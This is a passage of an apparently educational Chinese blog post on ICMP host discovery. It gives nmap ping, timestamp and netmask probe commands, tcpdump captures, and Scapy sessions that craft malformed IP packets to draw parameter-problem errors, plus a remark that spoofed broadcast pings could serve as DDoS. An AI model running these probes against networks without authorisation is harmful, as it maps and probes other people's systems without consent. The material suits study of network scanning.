 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.610563</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.9</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">59923</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.610565</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.10</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">44321</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612656</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.0</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">2542</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612681</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.5</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">52004</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612689</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.6</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">50499</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612705</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.7</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">49428</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612725</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.11</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">36</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612732</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.12</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">44368</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612745</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.30</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">34029</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612750</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.31</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">8416</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708321</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.17</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">22579</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708327</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.18</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">44220</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708331</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.20</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">9032</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708343</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.21</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">35831</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708347</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.22</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">2301</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708350</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.23</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">38652</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708353</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.24</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">48909</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708356</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.25</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">56868</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710492</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.26</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">11131</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710505</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.27</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">21052</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710515</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.28</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">51363</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710518</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.29</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">64922</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710521</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.14</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">38360</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710527</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.16</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">40280</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710531</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.15</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">22775</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712621</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.2</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">14586</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712632</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.3</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">52979</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712639</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.4</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">55009</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712646</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.8</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">48655</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712652</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.9</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">12270</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712657</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.10</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">52019</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811539</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.14</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">38654</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811554</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.15</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">36060</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811559</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.16</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">54453</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811564</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.26</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">58198</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811569</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.27</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">58807</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811574</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.28</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">25994</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811578</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.29</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">43528</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span></span>
</code></pre><p>看样子ping扫射时发了一个<code>ICMP echo request</code>不过瘾，又发了一次<code>ICMP time stamp query</code>。</p>
<p>广播ping也可以试着找出局域网内的机器。但通常windows机器都不会响应，安卓也不会响应地址是广播地址的ICMP echo request。</p>
<p>我们还可以看看广播地址的icmp echo request</p>
<p>如果伪造发送者ip，ping广播地址可以是潜在的DDOS。</p>
<pre><code> ~ ⮀ ping -b <span class="number">192.168</span><span class="number">.1</span><span class="number">.255</span>
WARNING: pinging broadcast address
PING <span class="number">192.168</span><span class="number">.1</span><span class="number">.255</span> (<span class="number">192.168</span><span class="number">.1</span><span class="number">.255</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of data.
<span class="number">64</span> bytes from <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">83.8</span> ms
<span class="number">64</span> bytes from <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">87.6</span> ms (DUP!)
</code></pre><p>额……发现两个iphone。。。</p>
<pre><code> ~ ⮀ sudo nmap -sS <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>

Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-03-15 14:34 CST</span>
Nmap scan report <span class="keyword">for</span> localhost (<span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>)
Host is up (<span class="number">0.0040</span>s latency).
Not <span class="string">shown:</span> <span class="number">999</span> closed ports
PORT      STATE SERVICE
<span class="number">62078</span>/tcp open  iphone-sync
MAC <span class="string">Address:</span> <span class="string">F1:</span><span class="string">DD:</span><span class="number">08</span>:<span class="string">AF:</span><span class="string">CB:</span>E9 (Unknown)

Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">41.44</span> seconds

 ~ ⮀ sudo nmap -sS <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span>

Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-03-15 14:37 CST</span>
Nmap scan report <span class="keyword">for</span> localhost (<span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span>)
Host is up (<span class="number">0.0053</span>s latency).
Not <span class="string">shown:</span> <span class="number">999</span> closed ports
PORT      STATE SERVICE
<span class="number">62078</span>/tcp open  iphone-sync
MAC <span class="string">Address:</span> <span class="number">83</span>:<span class="number">48</span>:<span class="number">4</span><span class="string">C:</span><span class="string">DD:</span><span class="number">5</span><span class="string">B:</span><span class="number">96</span> (Unknown)

Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">42.11</span> seconds
</code></pre><p>但安卓就不对广播ICMP request echo响应了。可以参考著名的<a href="http://althing.cs.dartmouth.edu/local/ICMP_Scanning_v3.0.pdf" target="_blank" rel="external">ICMP Usage in<br> Scanning</a>，很详细的文档，虽然年头早了些。</p>
<h2 id="ICMP_Timestamp_query">ICMP Timestamp query</h2><p>接下来试试timestamp request</p>
<pre><code> ~ ⮀ sudo nmap -sP -PP --disable-arp-ping bbs<span class="class">.byr</span><span class="class">.cn</span>

Starting Nmap <span class="number">6.25</span> ( http:<span class="comment">//nmap.org ) at 2014-03-15 14:48 CST</span>
Nmap scan report <span class="keyword">for</span> bbs<span class="class">.byr</span><span class="class">.cn</span> (<span class="number">123.127</span>.<span class="number">134.62</span>)
Host is up (<span class="number">0.0044s</span> latency).
Nmap done: <span class="number">1</span> IP <span class="tag">address</span> (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.23</span> seconds

<span class="number">15</span>:<span class="number">02</span>:<span class="number">20.679449</span> IP <span class="number">10.109</span>.<span class="number">20.127</span> &gt; <span class="number">10.3</span>.<span class="number">18.66</span>: ICMP <span class="tag">time</span> stamp query id <span class="number">6291</span> seq <span class="number">0</span>, length <span class="number">20</span>
<span class="number">15</span>:<span class="number">02</span>:<span class="number">20.682487</span> IP <span class="number">10.3</span>.<span class="number">18.66</span> &gt; <span class="number">10.109</span>.<span class="number">20.127</span>: ICMP <span class="tag">time</span> stamp reply id <span class="number">6291</span> seq <span class="number">0</span>: org <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.000</span>, recv <span class="number">07</span>:<span class="number">09</span>:<span class="number">19.107</span>, xmit <span class="number">07</span>:<span class="number">09</span>:<span class="number">19.107</span>, length <span class="number">20</span>
</code></pre><p>不是所有的机器都会响应。</p>
<pre><code> ~ ⮀ sudo nmap -<span class="variable">sP</span> -PP <span class="comment">--disable-arp-ping 10.109.20.1</span>

Starting Nmap <span class="number">6.25</span> ( <span class="keyword">http</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2014</span>-<span class="number">03</span>-<span class="number">15</span> <span class="number">15</span>:<span class="number">00</span> CST
Note: Host seems down. If <span class="keyword">it</span> is really up, but blocking our ping probes, <span class="keyword">try</span> -Pn
Nmap done: <span class="number">1</span> IP address (<span class="number">0</span> hosts up) scanned <span class="operator">in</span> <span class="number">2.20</span> <span class="built_in">seconds</span>


<span class="number">15</span>:<span class="number">00</span>:<span class="number">53.309360</span> IP <span class="number">10.109</span><span class="number">.20</span><span class="number">.127</span> &gt; <span class="number">10.109</span><span class="number">.20</span><span class="number">.1</span>: ICMP <span class="built_in">time</span> stamp query id <span class="number">48585</span> seq <span class="number">0</span>, <span class="built_in">length</span> <span class="number">20</span>
<span class="number">15</span>:<span class="number">00</span>:<span class="number">54.310449</span> IP <span class="number">10.109</span><span class="number">.20</span><span class="number">.127</span> &gt; <span class="number">10.109</span><span class="number">.20</span><span class="number">.1</span>: ICMP <span class="built_in">time</span> stamp query id <span class="number">60795</span> seq <span class="number">0</span>, <span class="built_in">length</span> <span class="number">20</span>
</code></pre><h2 id="ICMP_address_netmask_request">ICMP address netmask request</h2><p>这是个已经废弃的东西，现在推荐使用dhcp，不过看学校的一些路由器还是支持的</p>
<pre><code> ~ ⮀ sudo nmap -sP -PM <span class="comment">--disable-arp-ping 10.109.20.1</span>

Starting Nmap 6.25 ( http://nmap.org ) at 2014-03-15 14:59 CST
Nmap scan report for 10.109.20.1
Host is up (0.0025s latency).
MAC Address: 00:00:E0:60:00:00 (Hangzhou H3C Technologies Co.)
Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds


✘ ⮀ ~ ⮀ sudo tcpdump -i wlan0 "icmp"
tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
listening <span class="keyword">on</span> wlan0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
<span class="number">14</span>:<span class="number">59</span>:<span class="number">49.589370</span> IP <span class="number">10.109</span><span class="number">.20</span><span class="number">.127</span> &gt; <span class="number">10.109</span><span class="number">.20</span><span class="number">.1</span>: ICMP address <span class="keyword">mask</span> request, <span class="keyword">length</span> <span class="number">12</span>
<span class="number">14</span>:<span class="number">59</span>:<span class="number">49.591828</span> IP <span class="number">10.109</span><span class="number">.20</span><span class="number">.1</span> &gt; <span class="number">10.109</span><span class="number">.20</span><span class="number">.127</span>: ICMP address <span class="keyword">mask</span> <span class="keyword">is</span> <span class="number">0xfffffc00</span>, <span class="keyword">length</span> <span class="number">12</span></span>
</code></pre><p>谁会响应我们的非echo ICMP请求？</p>
<ul>
<li>监听状态的机器。</li>
<li>实现这个标准的操作系统。</li>
<li>配置为支持这个ICMP请求。</li>
<li>没有被防火墙墙掉。</li>
</ul>
<p>大多数机器对折中非echo的ICMP请求是没响应的。</p>
<pre><code>~ ⮀ sudo nmap -<span class="literal">sP</span> -PM/E/P --disable-arp-ping <span class="number">10</span>.<span class="number">109</span>.<span class="number">23</span>.<span class="number">255</span>

<span class="label">Starting</span> Nmap <span class="number">6</span>.<span class="number">25</span> ( http://nmap.org ) at <span class="number">2014</span>-<span class="number">03</span>-<span class="number">15</span> <span class="number">15</span>:<span class="number">07</span> CST
<span class="label">Note</span>: Host seems down. <span class="preprocessor">If</span> <span class="keyword">it </span>is really up, <span class="keyword">but </span><span class="keyword">blocking </span>our ping probes, try -Pn
<span class="label">Nmap</span> done: <span class="number">1</span> <span class="literal">IP</span> <span class="keyword">address </span>(<span class="number">0</span> hosts up) scanned in <span class="number">2</span>.<span class="number">18</span> seconds
</code></pre><h2 id="ICMP_Parameter_Problem_Error_messages">ICMP Parameter Problem Error messages</h2><p>让目标机器生成ICMP参数错误消息的方法有：</p>
<ul>
<li>搞乱IP头：<ul>
<li>头长度域</li>
<li>IP报文option部分</li>
</ul>
</li>
<li>在IP头中使用无效的域值<ul>
<li>在IP头中使用有效的域值</li>
</ul>
</li>
<li>滥用分片</li>
<li>UDP扫描主机探测方法。</li>
</ul>
<p>IP中伪造而不会被无声丢弃的域：</p>
<ul>
<li>ihl</li>
<li>option</li>
<li>proto尝试不使用的</li>
</ul>
<p>我们先试试改头长度域的：</p>
<p>我们造个ihl有问题的包(<code>ihl</code>的值是32位即一个字的个数)：</p>
<pre><code> ~ ⮀ sudo scapy
<span class="constant">Welcome</span> to <span class="constant">Scapy</span> (<span class="number">2.2</span>.<span class="number">0</span>)
<span class="prompt">&gt;&gt;</span>&gt; ip = <span class="constant">IP</span>()/<span class="constant">ICMP</span>()
<span class="prompt">&gt;&gt;</span>&gt; ip.dst=<span class="string">'10.3.18.66'</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.ihl=<span class="number">6</span>L
<span class="prompt">&gt;&gt;</span>&gt; ip.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="number">6</span>L
  tos= <span class="number">0x0</span>
  len= <span class="constant">None</span>
  id= <span class="number">1</span>
  flags= 
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= icmp
  chksum= <span class="constant">None</span>
  src= <span class="number">10.210</span>.<span class="number">96.200</span>
  dst= <span class="number">10.3</span>.<span class="number">18.66</span>
  \options\
<span class="comment">###[ ICMP ]###</span>
     type= echo-request
     code= <span class="number">0</span>
     chksum= <span class="constant">None</span>
     id= <span class="number">0x0</span>
     seq= <span class="number">0x0</span>
<span class="prompt">&gt;&gt;</span>&gt; send(ip)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.

<span class="symbol">tcpdump:</span> verbose output suppressed, use -v <span class="keyword">or</span> -vv <span class="keyword">for</span> full protocol decode
listening on eth<span class="number">0</span>, link-type <span class="constant">EN10MB</span> (<span class="constant">Ethernet</span>), capture size <span class="number">65535</span> bytes
<span class="number">14</span><span class="symbol">:</span><span class="number">45</span><span class="symbol">:</span><span class="number">29.035948</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.200</span> &gt; <span class="number">10.3</span>.<span class="number">18.66</span><span class="symbol">:</span> [|icmp]
<span class="number">14</span><span class="symbol">:</span><span class="number">45</span><span class="symbol">:</span><span class="number">29.039536</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.193</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span><span class="symbol">:</span> <span class="constant">ICMP</span> parameter problem - octet <span class="number">21</span>, length <span class="number">12</span>
</code></pre><p>为啥会参数错误，因为解析包的程序会把ICMP报文部分当成options处理。</p>
<p>同样，我们往options部分塞些奇奇怪怪的东西也可以完成同样效果。</p>
<pre><code> ~ ⮀ sudo scapy
<span class="constant">Welcome</span> to <span class="constant">Scapy</span> (<span class="number">2.2</span>.<span class="number">0</span>)
<span class="prompt">&gt;&gt;</span>&gt; ip = <span class="constant">IP</span>()/<span class="constant">ICMP</span>()
<span class="prompt">&gt;&gt;</span>&gt; ip.dst=<span class="string">'10.3.18.66'</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="constant">None</span>
  tos= <span class="number">0x0</span>
  len= <span class="constant">None</span>
  id= <span class="number">1</span>
  flags= 
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= icmp
  chksum= <span class="constant">None</span>
  src= <span class="number">10.210</span>.<span class="number">96.200</span>
  dst= <span class="number">10.3</span>.<span class="number">18.66</span>
  \options\
   |<span class="comment">###[ IPOption ]###</span>
   |  copy_flag= <span class="number">1</span>
   |  optclass= control
   |  option= extended_security
   |  length= <span class="constant">None</span>
   |  value= <span class="string">''</span>
<span class="comment">###[ ICMP ]###</span>
     type= echo-request
     code= <span class="number">0</span>
     chksum= <span class="constant">None</span>
     id= <span class="number">0x0</span>
     seq= <span class="number">0x0</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.options=<span class="constant">IPOption</span>(copy_flag=<span class="number">1</span>,optclass=<span class="number">0</span>,option=<span class="number">5</span>,value=<span class="string">''</span>)
<span class="prompt">&gt;&gt;</span>&gt; send(ip)
</code></pre><p>大快人心的是途中的路由返回的参数错误</p>
<pre><code> ~ ⮀ <span class="tag">sudo</span> <span class="tag">tcpdump</span> <span class="tag">-i</span> <span class="tag">eth0</span> "<span class="tag">icmp</span>"
 <span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
 <span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
 15<span class="pseudo">:13</span><span class="pseudo">:30</span><span class="class">.787605</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span> &gt; 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span>: <span class="tag">ICMP</span> <span class="tag">echo</span> <span class="tag">request</span>, <span class="tag">id</span> 0, <span class="tag">seq</span> 0, <span class="tag">length</span> 8
 15<span class="pseudo">:13</span><span class="pseudo">:30</span><span class="class">.790656</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">parameter</span> <span class="tag">problem</span> <span class="tag">-</span> <span class="tag">octet</span> 20, <span class="tag">length</span> 40

 ~ ⮀ <span class="tag">traceroute</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> 
